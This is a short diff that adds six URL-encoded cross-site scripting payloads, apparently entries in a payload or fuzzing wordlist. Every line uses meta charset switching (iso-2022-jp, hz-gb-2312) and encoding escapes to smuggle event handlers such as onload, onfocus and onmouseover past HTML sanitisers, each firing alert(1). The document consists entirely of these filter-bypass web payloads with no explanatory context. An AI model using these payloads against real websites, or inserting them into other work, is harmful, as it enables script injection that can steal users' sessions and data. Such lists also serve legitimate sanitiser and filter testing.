@@ -1,0 +1,6 @@
+<meta charset=iso-2022-jp>%1B(B%1B><svg onload=alert(1)>%1B$B%1B
+%20~}%22%3Cmeta%20charset=hz-gb-2312%3E%3Csvg%20onload%3Dalert%281%29%3E~{
+%3Cmeta%20charset=iso-2022-jp%3E%1B(J+onfocus=alert(1)%20autofocus%3E%1B$(D%1B(
+%3Cmeta+charset%3Dhz-gb-2312%3E%27~%7B%27%3C~%7D%22%20onmouseover=alert%281%29%20a=
+%3Cmeta%20charset=hz-gb-2312%3E~{!~}%22%20onfocus=alert%281%29%20autofocus%3E
+%1B%28J%3Cmeta%20charset%3Diso-2022-jp%3E%3Cbody%20onload=alert%281%29%3E%1B%24%40%1B
